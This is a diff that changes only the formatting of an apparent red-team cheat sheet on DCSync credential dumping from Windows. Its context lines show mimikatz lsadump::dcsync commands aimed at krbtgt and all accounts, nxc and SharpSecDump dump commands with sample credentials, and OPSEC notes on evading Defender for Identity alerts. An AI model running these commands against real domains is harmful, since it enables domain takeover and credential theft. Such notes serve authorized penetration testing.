@@ -17,7 +17,7 @@ linked:
 ---
 # DCSync - Windows Execution
 
-***
+---
 
 ## mimikatz lsadump::dcsync
 
@@ -51,7 +51,7 @@ mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
 mimikatz # lsadump::dcsync /domain:corp.local /all /csv
 ```
 
-___
+---
 
 ## mimikatz — sin DA (solo DCSync ACE)
 
@@ -67,7 +67,7 @@ ___
 mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
 ```
 
-___
+---
 
 ## nxc desde Windows (proxy)
 
@@ -77,7 +77,7 @@ ___
 | `nxc smb DC -u admin -p pass --ntds drsuapi` | DCSync method | Explícito. |
 ^dcsync-win-nxc
 
-___
+---
 
 ## SharpSecDump (.NET)
 
@@ -91,7 +91,7 @@ ___
 .\SharpSecDump.exe -target=dc01.corp.local -u=administrator -p='P@ssw0rd' -d=corp.local
 ```
 
-___
+---
 
 ## On-DC vs Remote
 
@@ -105,7 +105,7 @@ ___
 
 **Key:** Ejecutar desde el DC mismo puede evadir el alert específico de "DCSync desde non-DC" de MDI, pero genera otros eventos.
 
-___
+---
 
 ## OPSEC comparison
 
@@ -118,4 +118,4 @@ ___
 | VSS + ntds.dit copy | Medio | Sí | Si RCE en DC |
 ^dcsync-win-opsec
 
-***
+---
